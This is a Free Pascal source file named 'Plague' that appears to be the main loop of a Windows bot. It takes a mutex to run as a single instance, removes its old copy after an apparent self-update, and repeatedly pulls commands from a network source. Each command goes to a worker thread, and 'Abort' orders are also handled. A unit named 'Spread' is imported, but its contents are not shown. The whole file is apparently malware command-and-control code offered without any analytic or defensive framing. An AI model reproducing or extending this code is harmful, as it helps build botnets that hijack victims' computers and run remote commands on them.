program Plague;

{$mode objfpc}{$H+}

uses
  Debug,
  NetModule, Tools,
  Classes, Windows, SysUtils, CmdWorker, Spread;

var
  J, I: LongInt;
  CmdID, ToAbort: String;

{$R *.res}

Begin
  SetLastError(0);
  if ParamStr(1)='/open' then ShellExecute(0, 'open', 'explorer.exe',
    PChar(ParamStr(2)), nil, SW_NORMAL);
  LoadSettings;
  Initialize;
  if ParamStr(1)='/wait' then Sleep(Delay+200);
  if ParamStr(2)='/removeold' then
    if FileExists(ParamStr(0)+'.old') then DeleteFile(ParamStr(0)+'.old');
  if Settings.ReadInteger('General', 'FirstRun', 1) = 1 then DoFirstRun;
  Mutex:=CreateMutex(Nil, True, PChar(Settings.ReadString('General', 'Mutex', 'Plague')));
  if GetLastError=ERROR_ALREADY_EXIST then Halt(0);
  ChDir(Base);

  Net:=TNet.Create(Nil);
  Repeat
    try
    Net.GetCommands;
    Log('Available commands: '+IntToStr(Net.CommandCount), White);
    For J:=1 to Net.CommandCount do Begin
      CmdID:=Net.GetCommandID(J);
      //Check if it is an Abort command
      if Net.Commands.ReadString(CmdID, 'Type', '')='Abort' then Begin
        ToAbort:=Net.Commands.ReadString(CmdID, 'CommandID', '');
        I:=ExecIndex(ToAbort);
        if I>-1 then Begin
          Log('ABORT: Thread #'+IntToStr(I), Magenta);
          Workers[I].Abort(CmdID);
        end else Log('ABORT - Thread not found!', Magenta);
      end else Begin
        //Check if commands are already under execution
        I:=ExecIndex(CmdID);
        if I=-1 then Begin
          I:=FindAPlace;
          Log('Command ['+CmdID+'] of type '+Net.Commands.ReadString(CmdID, 'Type', '')+
          ' --> Worker #'+IntToStr(I)+'.', Cyan);
          Workers[I]:=TCmdWorker.Create(CmdID, I);
        end;
      end;
    end;
    //Readln;
    Sleep(Delay);
    except on E: Exception do Writeln('Fatal Exception: '+E.Message);
    end;
  until Not(AllowExecution);
  For J:=1 to High(Workers) do
  if Assigned(Workers[J]) then Begin
    Workers[J].Destroy;
  end;
  SetLength(Workers, 0);
  Net.Free;
  CloseHandle(Mutex);
end.
